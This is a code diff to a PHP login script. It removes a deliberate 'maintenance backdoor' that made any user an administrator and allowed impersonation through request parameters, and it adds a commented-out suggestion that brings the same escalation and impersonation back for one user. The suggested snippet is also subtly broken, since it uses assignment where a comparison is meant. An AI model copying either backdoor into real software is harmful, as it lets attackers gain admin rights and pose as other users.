@@ -158,14 +158,18 @@ if (!empty($login)) {
 				break;
 		}
 				
-  // ### ATTENTION!!! ###
-  // ### CHEAT MODE (MAINTENANCE BACKDOOR) ###
-  if (!empty($maintenance)) {
-   // THIS CONVERTS EVERYBODY INTO AN ADMINISTRATOR
-   $groups=array($user_group_name,$admin_group_name);
-   // OTHER USER IMPERSONATION
-   if (!empty($fake_login)) $login=$fake_login;
-  }
+  // If you want "john" to do maintenance tasks, add him to the admin
+  // group in the LDAP, or execute the following code here. This code
+  // would also allow him to impersonate some other user:
+  //
+  // if ($login="john") {
+  //   // Use "maintenance=1" GET parameter to become administrator
+  //   if (!empty($maintenance))
+  //     $groups=array($user_group_name,$admin_group_name);
+  //   // Use "impersonate=peter" GET parameter to impersonate "peter"
+  //   if (!empty($impersonate))
+  //     $login=$impersonate;
+  // }
 
   // Load the previous session info
   session_register("session_uid");
